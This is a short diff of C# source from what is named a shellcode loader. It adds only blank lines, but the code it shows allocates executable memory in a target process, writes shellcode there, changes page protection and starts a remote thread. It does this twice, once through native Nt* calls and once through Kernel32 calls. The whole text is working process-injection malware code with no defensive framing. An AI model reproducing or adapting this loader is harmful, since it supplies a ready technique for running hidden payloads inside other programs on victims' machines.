@@ -39,9 +39,12 @@ namespace ShellCodeLoader
         {
             Imports.NtAllocateVirtualMemory(Target.Handle, ref ptr, IntPtr.Zero, ref RegionSize, TypeAlloc.MEM_COMMIT | TypeAlloc.MEM_RESERVE, PageProtection.PAGE_EXECUTE_READWRITE);
             UIntPtr bytesWritten;
+            
             Imports.NtWriteVirtualMemory(Target.Handle, ptr, ShellCode, (UIntPtr)ShellCode.Length, out bytesWritten);
+            
             PageProtection flOld = new PageProtection();
             Imports.NtProtectVirtualMemory(Target.Handle, ref ptr, ref RegionSize, PageProtection.PAGE_EXECUTE_READ, ref flOld);
+            
             IntPtr hThread = IntPtr.Zero;
             Imports.NtCreateThreadEx(ref hThread, AccessMask.GENERIC_EXECUTE, IntPtr.Zero, Target.Handle, ptr, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
             //
@@ -52,10 +55,13 @@ namespace ShellCodeLoader
         private void Kernel32()
         {
             this.ptr = Imports.VirtualAllocEx(Target.Handle, IntPtr.Zero, (IntPtr)ShellCode.Length, TypeAlloc.MEM_COMMIT | TypeAlloc.MEM_RESERVE, PageProtection.PAGE_EXECUTE_READWRITE);
+            
             UIntPtr writtenBytes;
             Imports.WriteProcessMemory(Target.Handle, ptr, ShellCode, (UIntPtr)ShellCode.Length, out writtenBytes);
+          
             PageProtection flOld;
             Imports.VirtualProtectEx(Target.Handle, ptr, RegionSize, PageProtection.PAGE_EXECUTE_READ, out flOld);
+            
             IntPtr hThread = Imports.CreateRemoteThread(Target.Handle, IntPtr.Zero, 0, ptr, IntPtr.Zero, Imports.ThreadCreationFlags.NORMAL, out hThread);
         }
 
